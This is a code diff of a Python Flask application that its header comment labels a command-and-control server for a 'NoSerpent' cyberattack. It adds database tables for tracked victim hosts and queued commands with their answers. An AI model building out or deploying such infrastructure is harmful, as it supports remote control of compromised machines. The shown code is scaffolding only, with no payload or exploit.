@@ -1,8 +1,12 @@
 #!/usr/bin/env python3
 
+# C2 Server for NoSerpent Cyberattack
+# Made By Narek K. and Adel B.
+# 
+
 from flask import Flask, request, render_template, send_from_directory, jsonify
 from flask_cors import CORS
-from flask.helpers import safe_join
+# from flask.helpers import safe_join
 
 from colorama import init, Fore, Back, Style
 from hashlib import md5
@@ -20,38 +24,48 @@ import db
 
 app = Flask(__name__)
 app.config['FILES_FOLDER'] = "files"
-static = safe_join(os.path.dirname(__file__), 'static')
+# static = safe_join(os.path.dirname(__file__), 'static')
 
 
 CORS(app, resources={r'/*': {'origins': '*'}})
 
 
-
-#--------------------------
-# execute all together
-# ===============================================
+# create the database structure
 def main():
 	database = r"c2.db"
 
-	# create tables
-	'''
+	# create table hosts
 	sql_create_hosts = """
-		CREATE TABLE IF NOT EXISTS hosts (
+		CREATE TABLE hosts (
 			host_id INTEGER NOT NULL PRIMARY KEY,
-			hostname TEXT NOT NULL
-		);
-	"""
+			hostname TEXT NOT NULL,
+			hash TEXT NOT NULL DEFAULT "",
+			os TEXT DEFAULT 'windows',
+			ip TEXT
+		);"""
+
+	# create table commands
+	sql_create_commands = """
+		CREATE TABLE commands (
+			command_id INTEGER NOT NULL PRIMARY KEY,
+			command TEXT NOT NULL,
+			answer TEXT NULL,
+			answer_time DATETIME NULL,
+			status INTEGER NULL DEFAULT 0,
+			fk_host_id INTEGER NOT NULL, answer_url TEXT NULL,
+			FOREIGN KEY (fk_host_id) REFERENCES hosts(host_id)
+		);"""
 
 	# create db conn
-	conn = create_connection(database)
+	conn = db.create_connection(database)
 
 	# create tables
 	if conn is not None:
-		create_table(conn, sql_create_hosts)
-		create_table(conn, sql_create_cmdhistory)
+		db.create_table(conn, sql_create_hosts)
+		db.create_table(conn, sql_create_commands)
 	else:
 		print("Error! cannot create the database connection")
-	'''
+
 
 	conn = db.create_connection(database)
 
@@ -64,7 +78,7 @@ def main():
 def testdb():
 	main()
 
-	return "ok"
+	return "C2 Database Ready\n"
 # ===============================================
 #--------------------------
 
